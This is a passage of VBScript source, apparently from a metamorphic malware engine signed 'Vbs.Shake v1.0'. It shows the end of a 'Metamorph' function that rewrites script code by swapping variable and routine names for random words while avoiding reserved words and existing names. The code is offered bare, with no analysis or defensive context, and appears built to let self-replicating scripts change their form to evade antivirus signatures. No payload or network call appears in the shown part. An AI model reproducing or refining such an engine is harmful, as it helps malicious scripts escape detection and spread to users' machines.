      bCanReplace = (lastc <> "." and (instr(lcase(forbiddenwords)," " & newvar & " ") = 0) and (c<>"(" or instr(lcase(code),"function " & newvar) > 0 or instr(lcase(code),"sub " & newvar) > 0 or instr(replace(lcase(code)," ",""),newvar & "=") > 0 or instr(replace(lcase(code)," ",""),"(" & newvar & ")") > 0))
      if( bCanReplace ) then
       varlist = split(variables,";")
       bFound = False
       for pos=0 to ubound(varlist) step 2
        if( varlist(pos) = newvar ) then
         bFound = True
         exit for
        end if
       next
       if( not bFound ) then
        do
         rw = randomword(4,len(newvar))
        loop while( instr(forbiddenwords,lcase(rw))>0 or instr(lcase(variables),lcase(rw))>0 or left(lcase(rw),1) = "h" )
        if ( len(variables) = 0 )then
         variables = newvar & ";" & rw
        else
         variables = variables & ";" & newvar & ";" & rw
        end if
        varlist=split(variables,";")
        pos = ubound(varlist)-1
       end if
       codelines(lindex) = left(codelines(lindex),cnum+offset-len(newvar)-1) & varlist(pos+1) & right(codelines(lindex),len(codelines(lindex))-cnum-offset+1)
       offset = offset+len(varlist(pos+1))-len(newvar)
      end if
      newvar = ""
     end if
    next
    codelines(lindex) = left(codelines(lindex),len(codelines(lindex))-1)
   next
   code = join(codelines,vbcrlf)
   if len(code) > 0 then Metamorph = code
   end function
   '(c) Vbs.Shake v1.0
